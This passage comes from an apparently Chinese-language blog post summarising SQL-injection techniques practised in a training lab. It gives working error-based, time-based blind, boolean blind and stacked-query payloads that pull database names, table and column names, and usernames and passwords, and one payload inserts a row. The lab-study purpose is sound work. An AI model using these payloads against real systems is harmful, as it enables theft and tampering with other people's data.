+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users),1,32),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>可以通过修改position的值得到全部数据</p>
+<h3 id="2-3-3-延时注入"><a href="#2-3-3-延时注入" class="headerlink" title="2.3.3 延时注入"></a>2.3.3 延时注入</h3><h4 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h4><p>延时注入是在我们构造语句之后,通过页面的响应时间来判断正确的数据,当页面无回显时,可以构造延时语句进行注入</p>
+<p>延时主要用的函数为<strong>if()<strong>和</strong>sleep()</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>
+
+<p>如果expr1的值为TRUE,则if的返回值为expr2,否则为expr3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,999,666)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124213175.png" alt="image-20221201124213175"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(n)</span><br></pre></td></tr></table></figure>
+
+<p>n表示延迟的秒数</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124337650.png" alt="image-20221201124337650"></p>
+<h4 id="注入方法-2"><a href="#注入方法-2" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,页面无变化,使用延时函数成功延时</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124943294.png" alt="image-20221201124943294"></p>
+<p>SQL语句为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<h5 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if((length(database())=1),sleep(2),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>如果数据库的长度为1,则会延时两秒,可以通过页面返回的延时时间获取到正确的数据库长度</p>
+<p>当判断到数据库长度为8时,响应延时了2秒,证明数据库长度为8</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201130219446.png" alt="image-20221201130219446"></p>
+<h5 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring(database(),1,1))=1,sleep(2),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>数据库名由26个字母(区分大小写)和0-9个自然数加上下划线组成,相应的ascii码值为48-57、65-90、97-122、95,可以通过页面的响应时间判断数据库的第一个字符的ascii码值,再参照ascii码对照表得到数据库名的第一个字符,剩下的字符同理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring(database(),1,1))=115,sleep(2),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>延时2秒,证明ascii码值为115,对应的字符为s,则数据库第一个字符为s</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201131654510.png" alt="image-20221201131654510"></p>
+<h5 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1,sleep(2),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到101时,延时2秒,第一个表的表名第一个字符的ascii码值为101,即为e</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(2),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201132325990.png" alt="image-20221201132325990"></p>
+<h5 id="获取列名-2"><a href="#获取列名-2" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=1,sleep(2),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到85时,延时2秒,第一个列的列名第一个字符的ascii码值为85,即为U</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=85,sleep(2),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201133754247.png" alt="image-20221201133754247"></p>
+<h5 id="获取列中的数据-2"><a href="#获取列中的数据-2" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><p>获取到的列名为USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
+<p>现在获取username中的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select username from users limit 0,1),1,1))=1,sleep(2),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到68时,延时2秒,第一个列的列名第一个字符的ascii码值为68,即为D</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select username from users limit 0,1),1,1))=68,sleep(2),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201135543278.png" alt="image-20221201135543278"></p>
+<h3 id="2-3-4-布尔盲注"><a href="#2-3-4-布尔盲注" class="headerlink" title="2.3.4 布尔盲注"></a>2.3.4 布尔盲注</h3><h4 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h4><p>布尔(boolean)型是在计算机中的一种数据类型,只有True(真)和False(假)两个值,一般也称为逻辑性,当页面回显存在真和假两种情况时,可以使用布尔盲注</p>
+<p><strong>和延时注入的区别:</strong></p>
+<p>页面无任何变化的注入点,只能通过时间来判断是否执行了SQL语句的情况下使用延时注入,存在真假两种情况的注入点可以使用布尔盲注,效率比延时注入更高</p>
+<h4 id="注入方法-3"><a href="#注入方法-3" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-3"><a href="#判断注入点-3" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,无报错信息,无数据,使用布尔盲注</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201145511630.png" alt="image-20221201145511630"></p>
+<h5 id="判断数据库长度-1"><a href="#判断数据库长度-1" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到8时,返回正常界面,即数据库长度为8</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151409609.png" alt="image-20221201151409609"></p>
+<h5 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and ascii(substring(database(),1,1))=115 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到115时,返回正常界面,即数据库第一个字母的ascii码值为115,即为s</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151820419.png" alt="image-20221201151820419"></p>
+<h5 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and (ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到101时,返回正常界面,即第一个表名的第一个字符的ascii码值为101,即为e</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201153918305.png" alt="image-20221201153918305"></p>
+<h5 id="获取列名-3"><a href="#获取列名-3" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=85 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到85时,返回正常界面,第一个列的列名第一个字符的ascii码值为85,即为U</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160710682.png" alt="image-20221201160710682"></p>
+<h5 id="获取列中的数据-3"><a href="#获取列中的数据-3" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><p>获取到的列名为USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
+<p>现在获取username中的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and ascii(substring((select username from users limit 0,1),1,1))=68 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过遍历数字,遍历到68时,返回正常界面,第一个列的列名第一个字符的ascii码值为68,即为D</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160901890.png" alt="image-20221201160901890"></p>
+<h3 id="2-3-5-堆叠查询"><a href="#2-3-5-堆叠查询" class="headerlink" title="2.3.5 堆叠查询"></a>2.3.5 堆叠查询</h3><h4 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h4><p>堆叠注入是指执行多条SQL语句,在MySQL中,每一条语句后加**;<strong>表示语句结束,我们就可以多条语句一起执行,但是只有PHP使用</strong>mysqli_multi_query**函数时,才能造成堆叠查询</p>
+<p><strong>和联合查询的区别:</strong></p>
+<p>联合查询可以执行的句子是有限的,堆叠查询可以执行任意语句,但是这种注入方式不是十分完美的,在web系统中,代码通常只返回一个查询结果,因此堆叠注入第二条语句产生的错误或结果只能被忽略,在前端是无法看到返回结果的,因此在读取数据时,建议使用联合查询,同时在使用堆叠注入之前,我们也是需要知道一些数据库信息的,例如表名、列名</p>
+<h4 id="注入方法-4"><a href="#注入方法-4" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;insert into users(id,username,password) values (999,&#x27;test&#x27;,&#x27;test&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215145633.png" alt="image-20221203215145633"></p>
+<p>此时查看id&#x3D;999,数据已经成功被添加</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215212251.png" alt="image-20221203215212251"></p>
+<p>因为一般是看不到回显的,所以建议配合dnslog带出数据</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/blogs/js_decrypt/" rel="prev" title="记一次js加密算法逆向">
+      <i class="fa fa-chevron-left"></i> 记一次js加密算法逆向
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E9%A1%B9%E7%9B%AE%E5%87%86%E5%A4%87"><span class="nav-text">1.项目准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-text">2.要点总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">2.0 前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E5%B8%B8%E7%94%A8%E9%97%AD%E5%90%88%E7%AC%A6%E5%8F%B7"><span class="nav-text">2.1 常用闭合符号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">2.2 判断注入常用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3"><span class="nav-text">2.3 注入类型详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">2.3.1 联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="nav-text">判断查询列数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-text">判断显示位</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="nav-text">获取列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-text">获取列中的数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">2.3.2 报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-1"><span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D-1"><span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D-1"><span class="nav-text">获取列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE-1"><span class="nav-text">获取列中的数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-3-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-text">2.3.3 延时注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-2"><span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-2"><span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="nav-text">判断数据库长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D-2"><span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D-2"><span class="nav-text">获取列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE-2"><span class="nav-text">获取列中的数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-4-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">2.3.4 布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-3"><span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-3"><span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6-1"><span class="nav-text">判断数据库长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-3"><span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D-3"><span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D-3"><span class="nav-text">获取列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE-3"><span class="nav-text">获取列中的数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-5-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="nav-text">2.3.5 堆叠查询</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-4"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-4"><span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE"><span class="nav-text">添加数据</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="evi133"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">evi133</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">evi133</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
